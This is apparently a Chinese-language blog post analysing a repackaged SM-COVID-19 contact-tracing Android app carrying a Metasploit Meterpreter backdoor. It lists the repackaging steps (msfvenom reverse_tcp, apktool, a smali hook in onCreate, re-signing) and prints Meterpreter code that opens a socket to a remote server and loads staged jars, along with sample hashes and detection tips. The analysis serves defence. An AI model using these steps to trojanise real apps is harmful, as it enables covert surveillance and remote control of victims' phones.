---
layout: post
title: 安卓木马分析：被感染的SM-COVID-19应用
description: "结合安卓Meterpreter代码解析被重打包的应用实例"
modified: 2020-12-15
tags: [Android, Malware]
math: true
image:
  feature: abstract-7.jpg
---

<details open><!-- 可选open -->
<summary>Contents</summary>
<div markdown="1">
<!-- TOC -->

- [安卓木马分析：被感染的SM-COVID-19应用](#%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E8%A2%AB%E6%84%9F%E6%9F%93%E7%9A%84sm-covid-19%E5%BA%94%E7%94%A8)
    - [攻击概述](#%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0)
        - [攻击步骤](#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4)
        - [攻击效果](#%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C)
    - [定位恶意代码](#%E5%AE%9A%E4%BD%8D%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81)
    - [安卓Meterpreter](#%E5%AE%89%E5%8D%93meterpreter)
    - [恶意代码触发方式](#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F)

<!-- /TOC -->
</div>
</details>

## 安卓木马分析：被感染的SM-COVID-19应用

> SM-COVID-19是意大利公司SoftMining开发的APP，用于追踪病毒的接触轨迹。该应用被恶意软件开发者重打包，嵌入了[MSF(Metasploit Framework 渗透测试框架)的Meterpreter后门](https://www.jianshu.com/p/7e1431c9ad66)。

### 攻击概述

#### 攻击步骤

1. 确定良性的载荷APK（[SM-COVID-19](https://play.google.com/store/apps/details?id=it.softmining.projects.covid19.savelifestyle)）

2. 使用MSF的`msfvenom`工具生成恶意负载APK（Metasploit APK）

   ```shell
   $ msfvenom -p android/meterpreter/reverse_tcp LHOST=<url> # Remote Server IP
   ```

3. 反编译载荷APK和负载APK

   ```shell
   $ apktool d xxx.apk # use Apktool to decompile
   ```

4. 将Metasploit APK中Meterpreter的smali代码复制到载荷APK的smali目录下

5. 增加触发恶意代码的方法，即注入钩子（Hook）。例如，在入口点（即`AndroidManifest.xml`中包含intent-filter`<action android:name="android.intent.action.MAIN"/> `的activity）的smali代码中定位`onCreate()`方法，并在方法的起始位置添加一行smali代码：

   ```
   invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
   ```

   注：若要混淆`com/metasploit/stage/Payload`，还需修改`Payload`目录下所有此路径的引用，并改变其自身的目录名。

6. 将Metasploit APK的Manifest文件中的`uses-permission`（权限）和`uses-feature`（软硬件依赖）等补充到新APK的Manifest文件中

7. 打包新的APK

   ```shell
   $ apktool b xxx.apk
   ```

8. 重新签名

   ```shell
   $ keytool -genkey -v -keystore <sig>.keystore -alias <sig> # java工具生成自签名keystore
   $ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore <sig>.keystore xxx.apk <sig> # 使用keystore签名APK
   ```

<!--more-->

#### 攻击效果

当受害者在设备上启动受感染的应用后，原合法应用启动，但恶意代码会在后台连接攻击者的远程服务器。攻击者会获得一个可以执行[各种命令](https://gist.github.com/mataprasad/c5dd39154a852cdc67ff7958e0a82699)的shell，如`dump_sms`, `geolocate`, `webcam_snap`等。

### 定位恶意代码

1. 简单情况：未混淆，恶意代码的包名有明显的层级`com.metasploit.stage`

   >SHA256: f3d452befb5e319251919f88a08669939233c9b9717fa168887bfebf43423aca

2. 中等难度：包名被混淆了，但Manifest文件与原应用不同。反编译新增组件的代码，以匹配[Meterpreter代码](https://github.com/rapid7/metasploit-payloads)

   > SHA256: 7b8794ce2ff64a669d84f6157109b92f5ad17ac47dd330132a8e5de54d5d1afc

3. 复杂情况：Manifest文件与原应用相同。此时需要熟悉Meterpreter代码的特征，以搜索与其相似的部分（例如，硬编码的配置数组，涉及Socket的代码，`DexClassLoader`加载Jar文件的代码）

   >SHA256: 992f9eab66a2846d5c62f7b551e7888d03cea253fa72e3d0981d94f00d29f58a

### 安卓Meterpreter

在[安卓Meterpreter代码](https://github.com/rapid7/metasploit-payloads/tree/master/java/androidpayload/app/src/com/metasploit/stage)中，主函数入口点是`MainActivity`，由它启动实例化了`Payload`的`MainService`。在最重要的`Payload`类中，首先实现了以下操作：

1. 读取硬编码的exploit配置

   ```java
   private static final byte [] configBytes = new byte[] {                                   (byte) 0xde, (byte) 0xad, (byte) 0xba, (byte) 0xad, //placeholder                                   /*8192 bytes */ 0, 0, 0, 0, 0,... 
   };
   ...
   Config config = ConfigParser.parseConfig(configBytes);
   ```

   <figure><img src="{{ site.url }}/images/2020-01-19-COVID_Trojan/1_fLaNwUruNpfrrU0mFtIBGQ.png" style="zoom:50%;" /></figure>

2. 确保手机的CPU保持运转

   ```java
   PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE); 
   // PARTIAL_WAKE_LOCK使得CPU在屏幕和键盘不工作的情况下仍保持运转
   wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, Payload.class.getSimpleName());                                   wakeLock.acquire();
   ```

3. 按需隐藏应用图标

   ```java
   if ((config.flags & Config.FLAG_HIDE_APP_ICON) != 0) {                                           hideAppIcon();         
   }
   ```

4. 打开一个与远程服务器连接的socket

   ```java
   /*
   private static void runStageFromHTTP(String url) throws Exception {
       // 参数url是从恶意应用的硬编码配置中读取的
   }
   */
   
   private static void runStagefromTCP(String url) throws Exception {
       // string is in the format:   tcp://host:port
       String[] parts = url.split(":");
       int port = Integer.parseInt(parts[2]);
       String host = parts[1].split("/")[2];
       Socket sock = null;
   
       if (host.equals("")) {
           ServerSocket server = new ServerSocket(port);
           sock = server.accept();
           server.close();
       } else {
           sock = new Socket(host, port);
       }
   
       if (sock != null) {
           DataInputStream in = new DataInputStream(sock.getInputStream());
           OutputStream out = new DataOutputStream(sock.getOutputStream());
           runNextStage(in, out, parameters);
       }
   }
   ```

连接建立后，远程服务器通过向恶意应用发送一个Jar文件来实现命令执行，[不同的命令对应Jar中特定的类](https://github.com/rapid7/metasploit-payloads/tree/b03f213d4f5bbccb96e7dd491efbfa52aac19821/java/androidpayload/library/src/com/metasploit/meterpreter)。`Payload`接收Jar文件（`stageBytes`），并调用指定类的`start()`方法：

```java
    private static void runNextStage(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
        if (stageless_class != null) {
            Class<?> existingClass = Payload.class.getClassLoader().
                    loadClass(stageless_class);
            existingClass.getConstructor(new Class[]{
                    DataInputStream.class, OutputStream.class, Object[].class, boolean.class
            }).newInstance(in, out, parameters, false);
        } else {
            String path = (String) parameters[0];
            String filePath = path + File.separatorChar + Integer.toString(new Random().nextInt(Integer.MAX_VALUE), 36);
            String jarPath = filePath + ".jar";
            String dexPath = filePath + ".dex";

            // Read the class name
            String classFile = new String(loadBytes(in));

            // Read the stage
            byte[] stageBytes = loadBytes(in);
            File file = new File(jarPath);
            if (!file.exists()) {
                file.createNewFile();
            }
            FileOutputStream fop = new FileOutputStream(file);
            fop.write(stageBytes);
            fop.flush();
            fop.close();

            // Load the stage
            DexClassLoader classLoader = new DexClassLoader(jarPath, path, path,
                    Payload.class.getClassLoader());
            Class<?> myClass = classLoader.loadClass(classFile);
            final Object stage = myClass.newInstance();
            file.delete();
            new File(dexPath).delete();
            myClass.getMethod("start",
                    new Class[]{DataInputStream.class, OutputStream.class, Object[].class})
                    .invoke(stage, in, out, parameters);
        }

        session_expiry = -1;
    }
```

### 恶意代码触发方式

对应[攻击步骤](#攻击步骤)中的第5步。事实上，除了修改入口点代码，还有其它可选方式。在[第二节](#定位恶意代码)给出的三个样本中，第一个忘记触发了，后两个都重写（override）了`androidx.multidex`包下的`MultiDexApplication`类，并将Meterpreter代码中`MainService`的`start()`方法放在里面（此处Meterpreter中类名经过混淆，`MainService`即`Xmevv`）：

<figure><img src="{{ site.url }}/images/2020-01-19-COVID_Trojan/image-20210120112607552.png" alt="image-20210120112607552" style="zoom:50%;" /></figure>

参考文章

1. [Embedding Meterpreter in Android APK](https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/)
2. [Locating the Trojan inside an infected COVID-19 contact tracing app](https://cryptax.medium.com/locating-the-trojan-inside-an-infected-covid-19-contact-tracing-app-21e23f90fbfe)
3. [Into Android Meterpreter and how the malware launches it — part 2](https://cryptax.medium.com/into-android-meterpreter-and-how-the-malware-launches-it-part-2-ef5aad2ebf12)